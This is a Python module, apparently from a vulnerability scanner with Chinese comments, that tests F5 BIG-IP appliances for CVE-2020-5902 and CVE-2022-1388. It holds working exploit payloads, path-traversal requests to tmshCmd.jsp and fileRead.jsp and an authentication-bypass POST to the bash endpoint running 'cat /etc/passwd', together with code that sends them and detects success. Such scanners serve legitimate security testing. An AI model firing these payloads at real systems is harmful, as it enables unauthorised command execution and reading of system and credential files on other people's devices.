#!/usr/bin/env python3
# -*- coding:utf-8 -*-

''' 该POC没有经过实际环境验证, 如需启用该POC, 请参考文件最底部的提示, 并根据提示自行启用(或等作者验证POC可靠性之后, 在新版本中启用)
暂未找到漏洞环境, 还没测试POC准确性

    F5-BIG-IP扫描类: 
        1. F5-BIG-IP 远程代码执行
            CVE-2020-5902
                Payload: https://github.com/jas502n/CVE-2020-5902

        2. F5-BIG-IP 身份认证绕过
            CVE-2022-1388
                Payload: http://www.hackdig.com/05/hack-657629.htm
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests

class F5_BIG_IP():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'F5-BIG-IP'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_5902_payloads = [
            {
                'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin',
                'data': ''
            },
            {
                'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx',
                'data': ''
            },
            {
                'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd',
                'data': ''
            },
            # {
            #     'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:\Windows\System32\drivers\etc\hosts',
            #     'data': ''
            # },
            # {
            #     'path': 'tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=C:/Windows/System32/drivers/etc/hosts',
            #     'data': ''
            # }
        ]

        self.cve_2022_1388_payloads = [
            {
                'path': 'mgmt/tm/util/bash',
                'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
            }
        ]

    def cve_2020_5902_scan(self, url):
        ''' F5-BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞;
            未授权的远程攻击者通过向该页面发送特制的请求包, 可以造成任意Java 代码执行;
            进而控制 F5 BIG-IP 的全部功能, 包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2020-5902'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_5902_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('encrypted-password' in res.text) or ('partition-access' in res.text) or (('"output": "' in res.text) and ('"error": "",' in res.text)) or ('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text) or ('Microsoft Corp' in res.text) or ('Microsoft TCP/IP for Windows' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2022_1388_scan(self, url):
        ''' 未经身份验证的攻击者可以通过管理端口或自身IP地址
                对BIG-IP系统进行网络访问, 执行任意系统命令、创建或删除文件或禁用服务
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2022-1388'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Connection': 'close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host',
            'Content-type': 'application/json',
            'Authorization': 'Basic YWRtaW46',
            'X-F5-Auth-Token': 'mouse'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2022_1388_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('commandResult' in res.text) and (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data,
                        'Headers': vul_info['headers']
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2020_5902_scan, url=url),
            thread(target=self.cve_2022_1388_scan, url=url)
        ]

f5bigip = F5_BIG_IP()